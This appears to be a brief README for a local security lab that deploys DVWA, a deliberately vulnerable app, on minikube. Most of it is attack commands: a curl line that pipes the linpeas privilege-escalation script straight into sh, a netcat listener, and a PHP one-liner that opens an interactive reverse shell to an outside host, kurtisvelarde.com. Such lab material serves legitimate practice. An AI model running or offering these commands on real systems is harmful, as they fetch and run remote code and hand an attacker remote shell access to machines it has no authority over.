# Kubernetes deployment



## Minikube

The following show-cases how to deploy everything locally on minikube.

### Start minikube
```bash
minikube start
```


### Start DVWA

Retrieve the IP address minikube is running on
```bash
$ make deploy-dvwa
```

Linepeas
```bash
$ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### PHP reverse shell

Server

```bash
$ nc -l 45678
```

Client

```bash
$ php -r '$sock=fsockopen("kurtisvelarde.com",45678);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

### 

